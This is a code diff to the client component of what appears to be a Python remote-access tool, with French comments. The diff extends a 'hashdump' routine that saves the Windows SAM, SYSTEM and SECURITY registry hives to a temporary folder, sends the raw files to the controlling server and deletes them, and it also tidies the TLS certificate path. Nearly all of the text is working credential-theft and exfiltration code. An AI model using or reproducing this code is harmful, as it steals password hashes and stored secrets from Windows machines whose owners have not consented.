@@ -93,19 +93,28 @@ class CLIENT:
             self.send_data(result)
 
     def hashdump(self):
-        # Récupération des hachages de mots de passe
+        # Récupération des hachages de mots de passe pour Windows
         if os.name == 'nt':
             try:
                 sam_file = os.path.join(os.environ['TEMP'], 'sam')
                 system_file = os.path.join(os.environ['TEMP'], 'system')
-                subprocess.check_output(f"reg save HKLM\\SAM {sam_file}", shell=True)
-                subprocess.check_output(f"reg save HKLM\\SYSTEM {system_file}", shell=True)
+                security_file = os.path.join(os.environ['TEMP'], 'security')
+                
+                subprocess.check_output(f"reg save HKLM\\SAM {sam_file} /y", shell=True)
+                subprocess.check_output(f"reg save HKLM\\SYSTEM {system_file} /y", shell=True)
+                subprocess.check_output(f"reg save HKLM\\SECURITY {security_file} /y", shell=True)
+                
                 with open(sam_file, 'rb') as f:
-                    self.send_data(base64.b64encode(f.read()), encode=False)
+                    self.send_data(f.read(), encode=False)
                 with open(system_file, 'rb') as f:
-                    self.send_data(base64.b64encode(f.read()), encode=False)
+                    self.send_data(f.read(), encode=False)
+                with open(security_file, 'rb') as f:
+                    self.send_data(f.read(), encode=False)
+                
                 os.remove(sam_file)
                 os.remove(system_file)
+                os.remove(security_file)
+                
             except subprocess.CalledProcessError as e:
                 self.send_data(f"Error: {str(e)}")
         else:
@@ -133,10 +142,7 @@ class CLIENT:
         context.check_hostname = False
         
         # Détection du système d'exploitation et définition du chemin du certificat
-        if os.name == 'nt':
-            cert_path = os.path.join(os.path.dirname(__file__), '..', 'certificate', 'server.crt')
-        else:
-            cert_path = os.path.join(os.path.dirname(__file__), '..', 'certificate', 'server.crt')
+        cert_path = os.path.join(os.path.dirname(__file__), '..', 'certificate', 'server.crt')
         
         context.load_verify_locations(cafile=cert_path)
         
